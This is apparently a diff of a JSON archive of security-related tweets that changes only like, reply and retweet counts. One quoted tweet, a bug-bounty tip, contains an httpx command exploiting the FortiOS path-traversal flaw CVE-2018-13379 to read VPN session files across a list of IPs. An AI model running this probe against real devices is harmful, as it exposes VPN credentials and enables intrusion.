@@ -293,7 +293,7 @@
     "expanded_url": [
         "https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html"
     ],
-    "tweetfavorites": 498,
+    "tweetfavorites": 497,
     "tweetquotes": 5,
     "tweetreplies": 14,
     "tweetretweets": 179,
@@ -303,17 +303,17 @@
     "username": "NVamous"
 }
 {
-    "tweetfavorites": 391,
+    "tweetfavorites": 390,
     "tweetquotes": 0,
-    "tweetreplies": 6,
-    "tweetretweets": 114,
+    "tweetreplies": 7,
+    "tweetretweets": 113,
     "tweettext": "Title :- A path traversal vulnerability in the FortiOS SSL VPN web portal  CVE-2018-13379 🪲\n\n httpx -l ips.txt -path \"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\" -status-code -mc 200\n\n#BugBounty #bugbountytip #bugbountytips #Hacking #CyberSecurity https://t.co/pKp3NHlAOt",
     "tweettime": "2023-07-07, 08:38:53",
     "tweeturl": "https://twitter.com/TheMsterDoctor1/status/1677235726088323074",
     "username": "TheMsterDoctor1"
 }
 {
-    "tweetfavorites": 180,
+    "tweetfavorites": 181,
     "tweetquotes": 1,
     "tweetreplies": 7,
     "tweetretweets": 53,
